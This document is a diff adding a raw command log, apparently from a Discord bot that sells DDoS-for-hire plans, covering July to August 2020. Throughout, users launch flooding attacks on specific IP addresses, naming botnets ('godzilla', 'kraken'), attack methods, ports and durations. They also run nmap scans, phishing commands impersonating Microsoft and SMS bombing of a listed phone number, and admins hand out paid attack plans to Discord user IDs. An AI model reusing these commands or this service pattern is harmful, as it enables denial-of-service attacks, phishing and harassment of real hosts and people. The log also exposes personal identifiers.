@@ -1,0 +1,487 @@
+/getlog
+/clear 10
+/kys
+/cping 1.1.1.1
+/reboot
+/reboot
+/checkip 167.179.177.16
+/check 167.179.177.16
+/tr4p
+/help
+/reboot
+/admin
+/getbots
+/admin
+/reboot
+/tr4p
+/DDoS
+/DDoS UDP 167.179.177.16 60
+/methods
+/DDoS udp 167.179.177.16 60
+/DDoS tcp 167.179.177.16 120
+/DDoS udp 167.179.177.16 dport=80
+/DDoS udp 167.179.177.16 dport=80 60
+/fish Micosoft
+/phish Micosoft
+/check
+/phish quit
+/phishquit
+/phish
+/phish quit
+/phishquit
+/getbot
+/getbots
+/getbots
+/getbots
+/getbots
+/DDoS udp 167.179.177.16 60 dport=80
+/DDoS udp 167.179.177.16 120 dport=80
+/nmap
+/nmap 101.171.156.67
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmap 101.171.156.67
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmap 101.171.156.67
+/nmapresult
+/nmapresult
+/nmapresult
+// win the giveaway
+/restart
+/getplan <@682521245136191531>
+/tr4p
+/lag
+/sms
+/sms +61434147185
+/sms +61434147185 2
+/nuke
+/sms +61434147185 5
+/clear 7
+/accounts
+/tr4p
+/plans
+/tr4p
+/bots
+/admin
+/admin
+/plan
+/admin
+/Spotify
+/plan <@343782264326324225>
+///
+/getbots
+/getbots
+/spotify
+/ping google.com
+/admin
+/planusers
+/admin
+/ping 158.69.156.168
+/ping 158.69.156.168
+/getbots
+/methords
+/tr4p
+/getbots
+/getplan <@213336781934952448>
+/increaseplan <@213336781934952448> 3h
+/changeplan <@213336781934952448> 0
+/changeplan <@213336781934952448> 1
+/getplan <@213336781934952448>
+/increaseplan <@213336781934952448> 86400
+/increaseplan <@213336781934952448> 1d
+/decreaseplan 1d
+/decreaseplan <@213336781934952448> 1d
+/getplan <@213336781934952448>
+/plan
+/getplan <@724856239531491448>
+/tr4p
+/getplan <@724856239531491448>
+/planusers
+/changeplan <@724856239531491448> 0
+/getplan <@724856239531491448>
+/getplan <@213336781934952448>
+/getplan <@389973434605633542>
+/getbots
+/getplan <@!672652603880112148>
+/increaseplan <@!672652603880112148> 2d
+/ddos 162.248.88.85
+/serverinfo
+/methords
+/ping charlesm.xyz
+/ping pornhub.com
+/warn <@592515434830364683> Asking someone to boot an ip for them.
+/prices
+/price
+/pices
+/prices
+/plans
+/ddos godzilla vse 198.50.230.129 30 25565
+/ping 198.50.230.129
+/nmap 198.50.230.129
+/nmapresult
+/nmapresult
+/ping 198.50.230.129
+/nmap 198.50.230.129
+/nmapresult
+/ddos godzilla tcp 95.217.65.242 45 25565
+/nmap 95.217.65.242
+/nmapresult
+/ddos godzilla tcp 95.217.65.242 30
+/getbots
+/nmap 1.1.1.1
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmap 9.9.9.9
+/nmapresult
+/nmap 40.114.168.250
+/nmap 40.114.168.250
+/nmapresult
+/checkip 40.114.168.250
+/checkip 45.61.142.158
+/nmap works
+/kick <@702259459019374722>
+/kick <@702259459019374722> Trolling
+/clear 7
+/getplan <@213336781934952448>
+/ban <@213336781934952448>
+/ban <@213336781934952448> is nonce
+/nmap 192.168.1.5
+/nmapresult
+/nmap 192.168.1.10
+/nmapresult
+/claim 1234
+/changeplan <@592515434830364683> 0
+/claim
+/changeplan <@437709879155621889> 4
+/getplan <@213336781934952448>
+/nuke
+/nuke
+/getbots
+/tr4p
+/getbots
+/tr4p
+/ddos
+/pex group default add essentails.back
+/prices
+/plans
+/plans
+/ddos
+/DDoS 95.217.149.161:25567
+/servers
+/serverinfo
+/ddos Godzilla squid 95.217.149.161 1
+/methods
+/ddos Godzilla VSE 95.217.149.161 1
+/getbots
+/getplan <@277500960065060864>
+/DDoS
+/DDoS 73.15.219.233
+/serverinfo
+/DDoS Kraken squid 73.15.219.233 120
+/DDoS Kraken squid 73.15.219.233 120
+/change plan <@682521245136191531> 4
+/changeplan @Charles. 4
+/plan
+/increaseplan 9999y
+/increaseplan <@682521245136191531>  9999y
+/changeplan <@682521245136191531> 4
+/plan
+/getplan <@357361661524443137>
+/increaseplan <@357361661524443137> 1d
+/serverstatus
+/checkservers
+/getbots
+/changeplan <@277500960065060864> 1
+/getplan <@277500960065060864>
+/increaseplan <@277500960065060864> 3d
+/changeplan <@714247184622813224> 0
+/getplan <@682521245136191531>
+/DDoS
+/checkservers
+/kick <@346068396233981952>
+/kick @G0N3PH1SH1NG .
+/ping 8.8.8.8
+/Getplan <@688760216124391449>
+/getplan <@720102547834011719>
+/getplan <@277500960065060864>
+/tr4p
+/info
+/giveplan <@718689080065654785> 4
+/changeplan <@718689080065654785> 4
+/increaseplan <@718689080065654785> 999y
+/get plan <@718689080065654785>
+/getplan <@718689080065654785>
+/DDoS Godzilla TCP 109.183.186.287
+/DDoS Godzilla TCP 1.1.1.1 1
+/DDoS Godzilla TCP 131.242.7.130 1600
+/DDoS Godzilla TCP 131.242.7.130 120
+/getplan <@688760216124391449>
+/getbots
+/getbots godzilla
+/getbots kraken
+/getplan <@697238828938952746>
+/getbots Kraken
+/changeplan <@733410388229488691> 3
+/getplan <@733410388229488691>
+/getbots kraken
+/changeplan <@663427887906684928> 3
+/getplan <@663427887906684928>
+/checkip 69.115.124.44
+/getbots kraken
+/ddos
+/checkservers
+/methords
+/methods
+/ddos godzilla vse 69.162.108.171 120
+/ddos godzilla vse 185.13.156.64 60
+/ddos godzilla vse 103.95.221.87 60
+/ddos godzilla std 103.95.221.84 300
+/ddos godzilla std 103.95.221.84 60
+/ddos godzilla std 117.27.239.28 60
+/getbots godzilla
+/checkservers
+/getbots kraken
+/.
+/tr4p
+/getbots gotzilla
+/getbots kraken
+/tr4p
+/tesy
+/test
+/prices
+/plans
+/changeplan <@725548393337716756> 1
+/getplan <@725548393337716756>
+/increaseplan <@725548393337716756> 2d
+/plans
+/methods
+/ping 76.184.51.132
+/ping 76.184.51.132
+/ping 76.184.51.132
+/getbots godzilla
+/getbots Kraken
+/getbots Kraken
+/checkip 76.184.51.132
+/DDoS Godzilla UDP 76.184.51.132 60
+/ping 76.184.51.132
+/methods
+/getbots Kraken
+/getbots Kraken
+/getbots Godzilla
+/planusers
+/test
+/reboot
+/planusers
+/getplanusers
+/planusers
+/getplan <@145663323340406785>
+/getplan <@437709879155621889>
+/getplan <@509066161778851872>
+/getplan <@477320863738363905>
+/increase plan <@477320863738363905> 2d
+/increaseplan <@!477320863738363905> 2d
+/getplan <@477320863738363905>
+/increaseplan <@477320863738363905> 2d
+/getplan <@477320863738363905>
+/getplan <@477320863738363905>
+/getbots Godzilla
+/tr4p
+/getbots Kraken
+/getbots Godzilla
+/checkservers
+[Wed Jul 29 2020 12:10:13 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Jul 29 2020 12:51:54 GMT-1100 (Samoa Standard Time)] /getplan <@175019224656248832>
+[Wed Jul 29 2020 13:28:31 GMT-1100 (Samoa Standard Time)] /pring
+[Wed Jul 29 2020 13:28:34 GMT-1100 (Samoa Standard Time)] /ping
+[Wed Jul 29 2020 14:41:30 GMT-1100 (Samoa Standard Time)] /get bots
+[Wed Jul 29 2020 14:41:34 GMT-1100 (Samoa Standard Time)] /getbots
+[Wed Jul 29 2020 14:41:46 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Wed Jul 29 2020 14:42:00 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Jul 29 2020 15:23:57 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Jul 29 2020 15:24:09 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Jul 29 2020 19:05:24 GMT-1100 (Samoa Standard Time)] /test
+[Thu Jul 30 2020 00:25:42 GMT-1100 (Samoa Standard Time)] /changeplan <@469284720606314496> 0
+[Thu Jul 30 2020 11:56:18 GMT-1100 (Samoa Standard Time)] /getbots
+[Thu Jul 30 2020 11:56:27 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Thu Jul 30 2020 11:56:35 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Thu Jul 30 2020 11:57:03 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Thu Jul 30 2020 12:43:33 GMT-1100 (Samoa Standard Time)] /getplan <@620611374317305866>
+[Thu Jul 30 2020 14:10:42 GMT-1100 (Samoa Standard Time)] /changeplan <@!270361580946849792> 0
+[Thu Jul 30 2020 14:10:55 GMT-1100 (Samoa Standard Time)] /getplan <@!270361580946849792>
+[Thu Jul 30 2020 14:11:13 GMT-1100 (Samoa Standard Time)] /changeplan 270361580946849792 0
+[Thu Jul 30 2020 14:11:22 GMT-1100 (Samoa Standard Time)] /getplan <@!270361580946849792>
+[Thu Jul 30 2020 14:13:33 GMT-1100 (Samoa Standard Time)] /clear 5
+[Thu Jul 30 2020 14:13:38 GMT-1100 (Samoa Standard Time)] /clear 2
+[Thu Jul 30 2020 14:37:11 GMT-1100 (Samoa Standard Time)] /changeplan <@!270361580946849792> 3
+[Thu Jul 30 2020 14:37:20 GMT-1100 (Samoa Standard Time)] /getplan <@!270361580946849792>
+[Thu Jul 30 2020 14:37:35 GMT-1100 (Samoa Standard Time)] /changeplan 270361580946849792 3
+[Thu Jul 30 2020 14:37:40 GMT-1100 (Samoa Standard Time)] /getplan <@!270361580946849792>
+[Thu Jul 30 2020 14:45:41 GMT-1100 (Samoa Standard Time)] /ddos godzilla std 0.0.0.0 60
+[Thu Jul 30 2020 15:27:54 GMT-1100 (Samoa Standard Time)] /getbots Godzilla
+[Thu Jul 30 2020 15:28:02 GMT-1100 (Samoa Standard Time)] /getbots Kraken
+[Thu Jul 30 2020 15:35:05 GMT-1100 (Samoa Standard Time)] /getplan <@716768224997277757>
+[Thu Jul 30 2020 15:36:01 GMT-1100 (Samoa Standard Time)] /getplan <@477320863738363905>
+[Thu Jul 30 2020 15:36:20 GMT-1100 (Samoa Standard Time)] /getplan <@357899018451550209>
+[Thu Jul 30 2020 15:36:53 GMT-1100 (Samoa Standard Time)] /getplan <@697238828938952746>
+[Thu Jul 30 2020 15:37:22 GMT-1100 (Samoa Standard Time)] /getplan <@673349913480003604>
+[Thu Jul 30 2020 15:38:33 GMT-1100 (Samoa Standard Time)] /getplan <@655495567018950731>
+[Thu Jul 30 2020 15:39:07 GMT-1100 (Samoa Standard Time)] /getplan <@268433217214873601>
+[Thu Jul 30 2020 15:39:41 GMT-1100 (Samoa Standard Time)] /getplan ♪───Ｏ（≧∇≦）Ｏ────♪
+[Thu Jul 30 2020 15:39:49 GMT-1100 (Samoa Standard Time)] /getplan <@725548393337716756>
+[Thu Jul 30 2020 18:14:30 GMT-1100 (Samoa Standard Time)] /getplan <@401206698515234816>
+[Thu Jul 30 2020 18:31:10 GMT-1100 (Samoa Standard Time)] /getplan <@623367729788878860>
+[Thu Jul 30 2020 18:33:17 GMT-1100 (Samoa Standard Time)] /changeplan <@623367729788878860> 1
+[Thu Jul 30 2020 18:33:21 GMT-1100 (Samoa Standard Time)] /getplan <@623367729788878860>
+[Thu Jul 30 2020 18:33:34 GMT-1100 (Samoa Standard Time)] /increaseplan <@623367729788878860> 1d
+[Fri Jul 31 2020 17:02:58 GMT-1100 (Samoa Standard Time)] /tr4p
+[Fri Jul 31 2020 17:03:09 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Fri Jul 31 2020 17:06:35 GMT-1100 (Samoa Standard Time)] /ddos
+[Fri Jul 31 2020 17:06:49 GMT-1100 (Samoa Standard Time)] /methords
+[Fri Jul 31 2020 17:07:02 GMT-1100 (Samoa Standard Time)] /methods
+[Fri Jul 31 2020 17:08:02 GMT-1100 (Samoa Standard Time)] /Tr4p
+[Fri Jul 31 2020 17:41:42 GMT-1100 (Samoa Standard Time)] /getplan <@!418537208396644352>
+[Fri Jul 31 2020 19:01:46 GMT-1100 (Samoa Standard Time)] /checkip 101.98.99.44
+[Fri Jul 31 2020 19:02:13 GMT-1100 (Samoa Standard Time)] /ddos
+[Fri Jul 31 2020 19:02:22 GMT-1100 (Samoa Standard Time)] /methods
+[Fri Jul 31 2020 19:02:45 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.98.99.44 120
+[Fri Jul 31 2020 19:03:13 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 101.98.99.44 120
+[Fri Jul 31 2020 19:03:56 GMT-1100 (Samoa Standard Time)] /ping 101.98.99.44
+[Fri Jul 31 2020 19:04:05 GMT-1100 (Samoa Standard Time)] /ping 101.98.99.44
+[Fri Jul 31 2020 19:06:03 GMT-1100 (Samoa Standard Time)] /ddos kraken vse 101.98.99.44 120
+[Fri Jul 31 2020 19:06:16 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.98.99.44 120
+[Fri Jul 31 2020 19:09:37 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.98.99.44 1000
+[Fri Jul 31 2020 22:59:14 GMT-1100 (Samoa Standard Time)] /purge
+[Sat Aug 01 2020 01:22:56 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.98.99.44 30
+[Sat Aug 01 2020 01:31:15 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 101.98.99.44 1000
+[Sat Aug 01 2020 01:31:25 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Sat Aug 01 2020 03:27:02 GMT-1100 (Samoa Standard Time)] /checkip 147.135.124.129
+[Sat Aug 01 2020 03:30:01 GMT-1100 (Samoa Standard Time)] /checkip mc.queencity.pro
+[Sat Aug 01 2020 03:34:22 GMT-1100 (Samoa Standard Time)] /checkip 192.99.254.74
+[Sat Aug 01 2020 03:34:48 GMT-1100 (Samoa Standard Time)] /methords
+[Sat Aug 01 2020 03:34:53 GMT-1100 (Samoa Standard Time)] /methods
+[Sat Aug 01 2020 03:36:19 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 192.99.254.74 60
+[Sat Aug 01 2020 03:37:03 GMT-1100 (Samoa Standard Time)] /ddos kraken ovh-smash 192.99.254.74 60
+[Sat Aug 01 2020 03:39:58 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 192.99.254.74 1000
+[Sat Aug 01 2020 03:40:10 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 192.99.254.74 120
+[Sat Aug 01 2020 03:40:27 GMT-1100 (Samoa Standard Time)] /are you a whore pls work
+[Sun Aug 02 2020 18:08:01 GMT-1100 (Samoa Standard Time)] /blacklist 9.9.9.9
+[Sun Aug 02 2020 19:25:24 GMT-1100 (Samoa Standard Time)] /checkip 172.114.158.202
+[Sun Aug 02 2020 19:26:22 GMT-1100 (Samoa Standard Time)] /blacklist 172.114.158.202
+[Mon Aug 03 2020 01:40:19 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Mon Aug 03 2020 23:02:54 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Mon Aug 03 2020 23:05:10 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Mon Aug 03 2020 23:05:24 GMT-1100 (Samoa Standard Time)] /test
+[Mon Aug 03 2020 23:05:28 GMT-1100 (Samoa Standard Time)] /reboot
+[Mon Aug 03 2020 23:05:47 GMT-1100 (Samoa Standard Time)] /reboot
+[Tue Aug 04 2020 15:32:05 GMT-1100 (Samoa Standard Time)] /checkservers
+[Tue Aug 04 2020 15:47:56 GMT-1100 (Samoa Standard Time)] /skid
+[Tue Aug 04 2020 22:55:24 GMT-1100 (Samoa Standard Time)] /plan
+[Wed Aug 05 2020 12:44:47 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Wed Aug 05 2020 12:44:57 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Wed Aug 05 2020 12:45:08 GMT-1100 (Samoa Standard Time)] /test
+[Wed Aug 05 2020 12:45:15 GMT-1100 (Samoa Standard Time)] /skid
+[Wed Aug 05 2020 16:00:43 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Aug 05 2020 23:24:42 GMT-1100 (Samoa Standard Time)] /getplan <@!672652603880112148>
+#1000
+[Wed Aug 05 2020 23:24:53 GMT-1100 (Samoa Standard Time)] /getplan <@!672652603880112148>
+[Thu Aug 06 2020 21:44:07 GMT-1100 (Samoa Standard Time)] /getbots Godzilla
+[Fri Aug 07 2020 12:29:51 GMT-1100 (Samoa Standard Time)] /checkservers
+[Sat Aug 08 2020 19:17:58 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Sun Aug 09 2020 12:53:20 GMT-1100 (Samoa Standard Time)] /changeplan <@560606124559171586> 1
+[Sun Aug 09 2020 12:53:29 GMT-1100 (Samoa Standard Time)] /getplan <@560606124559171586>
+[Sun Aug 09 2020 12:54:09 GMT-1100 (Samoa Standard Time)] /changeplan <@560606124559171586> 1d
+[Sun Aug 09 2020 12:54:23 GMT-1100 (Samoa Standard Time)] /getplan <@560606124559171586>
+[Mon Aug 10 2020 10:18:05 GMT-1100 (Samoa Standard Time)] /getbots Kraken
+[Mon Aug 10 2020 12:15:58 GMT-1100 (Samoa Standard Time)] /changeplan <@705692379369177088> 3
+[Mon Aug 10 2020 12:16:03 GMT-1100 (Samoa Standard Time)] /getplan <@705692379369177088>
+[Mon Aug 10 2020 12:16:20 GMT-1100 (Samoa Standard Time)] /increaseplan <@705692379369177088> 29d
+[Mon Aug 10 2020 12:16:37 GMT-1100 (Samoa Standard Time)] /increaseplan <@705692379369177088> 1h
+[Mon Aug 10 2020 12:16:56 GMT-1100 (Samoa Standard Time)] /increaseplan 705692379369177088 1d
+[Mon Aug 10 2020 12:17:29 GMT-1100 (Samoa Standard Time)] /getplan <@705692379369177088>
+[Mon Aug 10 2020 17:40:18 GMT-1100 (Samoa Standard Time)] /DDoS
+[Mon Aug 10 2020 17:40:26 GMT-1100 (Samoa Standard Time)] /ddos
+[Mon Aug 10 2020 17:40:53 GMT-1100 (Samoa Standard Time)] /ddos Kraken squid 131.242.7.134 120
+[Mon Aug 10 2020 17:42:20 GMT-1100 (Samoa Standard Time)] /ddos Kraken squid 131.242.7.134 120
+[Mon Aug 10 2020 17:44:08 GMT-1100 (Samoa Standard Time)] /ddos Kraken squid 131.242.7.134 320
+[Mon Aug 10 2020 17:46:03 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla UDP 131.242.7.134 300
+[Mon Aug 10 2020 17:46:16 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla UDP 131.242.7.134 120
+[Mon Aug 10 2020 17:46:57 GMT-1100 (Samoa Standard Time)] /DDoS Godzilla UDP 131.242.7.134 120
+[Tue Aug 11 2020 21:47:22 GMT-1100 (Samoa Standard Time)] /checkip 194.154.223.173
+[Tue Aug 11 2020 21:48:11 GMT-1100 (Samoa Standard Time)] /checkip 194.154.223.173
+[Tue Aug 11 2020 21:48:24 GMT-1100 (Samoa Standard Time)] /checkip 10.155.196.93
+[Tue Aug 11 2020 21:48:38 GMT-1100 (Samoa Standard Time)] /checkip 25.121.138.27
+[Tue Aug 11 2020 21:52:45 GMT-1100 (Samoa Standard Time)] /checkip 110.151.133.100
+[Tue Aug 11 2020 21:53:32 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 110.151.133.100 120
+[Tue Aug 11 2020 21:56:30 GMT-1100 (Samoa Standard Time)] /ddos kraken UDP 110.151.133.100 120
+[Tue Aug 11 2020 21:57:33 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Tue Aug 11 2020 21:57:43 GMT-1100 (Samoa Standard Time)] /getbot
+[Fri Aug 14 2020 10:28:03 GMT-1100 (Samoa Standard Time)] /changeplan <@701879552556925060> 3
+[Fri Aug 14 2020 10:28:23 GMT-1100 (Samoa Standard Time)] /increaseplan <@701879552556925060> 30d
+[Fri Aug 14 2020 10:28:36 GMT-1100 (Samoa Standard Time)] /getplan <@701879552556925060>
+[Sun Aug 16 2020 10:44:37 GMT-1100 (Samoa Standard Time)] /getplan @...............................
+[Sun Aug 16 2020 10:44:52 GMT-1100 (Samoa Standard Time)] /getplan <@574032805802147840>
+[Mon Aug 17 2020 17:35:29 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 17 2020 17:35:53 GMT-1100 (Samoa Standard Time)] /changeplan <@682521245136191531> 69
+[Mon Aug 17 2020 17:35:56 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 17 2020 17:36:11 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 999y
+[Mon Aug 17 2020 17:36:17 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 999y
+[Mon Aug 17 2020 17:36:17 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 999y
+[Mon Aug 17 2020 17:36:18 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 999y
+[Mon Aug 17 2020 17:36:19 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 999y
+[Mon Aug 17 2020 17:36:22 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 17 2020 17:37:03 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 40213373074552d
+[Mon Aug 17 2020 17:37:12 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 40213373074552d
+[Mon Aug 17 2020 17:37:16 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 17 2020 19:01:30 GMT-1100 (Samoa Standard Time)] /info
+[Mon Aug 17 2020 21:45:17 GMT-1100 (Samoa Standard Time)] /getbots kraken
+[Mon Aug 17 2020 21:45:29 GMT-1100 (Samoa Standard Time)] /getbots godzilla
+[Mon Aug 17 2020 22:38:41 GMT-1100 (Samoa Standard Time)] /getplan <@!145663323340406785>
+[Tue Aug 18 2020 14:16:40 GMT-1100 (Samoa Standard Time)] /prices.e
+[Wed Aug 19 2020 23:36:55 GMT-1100 (Samoa Standard Time)] /admin
+[Thu Aug 20 2020 17:51:07 GMT-1100 (Samoa Standard Time)] /admin
+[Thu Aug 20 2020 17:51:40 GMT-1100 (Samoa Standard Time)] /tr4p
+[Thu Aug 20 2020 19:50:28 GMT-1100 (Samoa Standard Time)] /getbots Kraken
+[Fri Aug 21 2020 13:11:17 GMT-1100 (Samoa Standard Time)] /changeplan <@682521245136191531> 69
+[Fri Aug 21 2020 13:11:36 GMT-1100 (Samoa Standard Time)] /getplan <@682521245136191531>
+[Fri Aug 21 2020 13:12:03 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531> 999y
+[Fri Aug 21 2020 13:12:15 GMT-1100 (Samoa Standard Time)] /increaseplan @Charles. 999y
+[Fri Aug 21 2020 13:13:04 GMT-1100 (Samoa Standard Time)] /increaseplan <@682521245136191531>  9999y
+[Fri Aug 21 2020 13:14:08 GMT-1100 (Samoa Standard Time)] /increaseplan <@294609395071975434> 999y
+[Fri Aug 21 2020 13:14:23 GMT-1100 (Samoa Standard Time)] /increaseplan <@294609395071975434> 9999y
+[Fri Aug 21 2020 15:34:41 GMT-1100 (Samoa Standard Time)] /chnageplan <@346068396233981952>
+[Fri Aug 21 2020 15:35:02 GMT-1100 (Samoa Standard Time)] /chnageplan @i am haxor 69
+[Fri Aug 21 2020 15:35:25 GMT-1100 (Samoa Standard Time)] /chnageplan <@346068396233981952>  69
+[Fri Aug 21 2020 15:36:15 GMT-1100 (Samoa Standard Time)] /changeplan <@346068396233981952>  69
+[Fri Aug 21 2020 15:36:40 GMT-1100 (Samoa Standard Time)] /increaseplan <@346068396233981952> 30d
+[Fri Aug 21 2020 15:36:50 GMT-1100 (Samoa Standard Time)] /increaseplan @i am haxor 999y
+[Fri Aug 21 2020 15:37:07 GMT-1100 (Samoa Standard Time)] /increaseplan <@346068396233981952> 999y
+[Fri Aug 21 2020 21:12:13 GMT-1100 (Samoa Standard Time)] /getplan <@659975663167471628>
+[Fri Aug 21 2020 21:13:56 GMT-1100 (Samoa Standard Time)] /serverstatus
+[Sun Aug 23 2020 02:46:51 GMT-1100 (Samoa Standard Time)] /getbots Kraken
+[Mon Aug 24 2020 01:05:50 GMT-1100 (Samoa Standard Time)] /admin
+[Mon Aug 24 2020 01:06:17 GMT-1100 (Samoa Standard Time)] /changeplan <@357488568467193867> 7
+[Mon Aug 24 2020 01:06:27 GMT-1100 (Samoa Standard Time)] /getplan <@357488568467193867>
+[Mon Aug 24 2020 16:37:16 GMT-1100 (Samoa Standard Time)] /getplan <@!277500960065060864>
+[Mon Aug 24 2020 16:37:30 GMT-1100 (Samoa Standard Time)] /plan <@!277500960065060864> 0
+[Mon Aug 24 2020 16:37:34 GMT-1100 (Samoa Standard Time)] /admin
+[Mon Aug 24 2020 16:37:47 GMT-1100 (Samoa Standard Time)] /changeplan <@!277500960065060864> 3
+[Mon Aug 24 2020 16:37:52 GMT-1100 (Samoa Standard Time)] /getplan <@!277500960065060864>
+[Mon Aug 24 2020 16:38:06 GMT-1100 (Samoa Standard Time)] /increaseplan <@!277500960065060864> 30d
+[Mon Aug 24 2020 16:38:43 GMT-1100 (Samoa Standard Time)] /forceplanupdates
+[Mon Aug 24 2020 16:38:49 GMT-1100 (Samoa Standard Time)] /getplan <@!277500960065060864>
+[Tue Aug 25 2020 13:54:47 GMT-1100 (Samoa Standard Time)] /methods
